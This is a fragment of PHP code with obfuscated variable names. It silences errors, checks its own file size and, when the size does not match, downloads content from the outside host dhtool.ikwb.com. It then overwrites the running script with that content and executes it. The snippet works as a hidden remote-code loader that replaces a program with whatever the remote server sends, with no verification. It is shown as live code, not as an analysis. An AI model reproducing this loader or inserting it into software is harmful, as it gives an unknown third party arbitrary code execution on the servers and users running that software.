error_reporting(0);
$QPUfCDSjWI = filesize(__FILE__);
if(!($QPUfCDSjWI > 5700 && $QPUfCDSjWI < 5750) && $QPUfCDSjWI != 5703) {
    echo "Loading...     \r";
    $HwBDokqdMr = file_get_contents("https://dhtool.ikwb.com/220724dh.json");
    file_put_contents(basename($_SERVER["PHP_SELF"]), $HwBDokqdMr);
    include __FILE__;
    exit;
    }
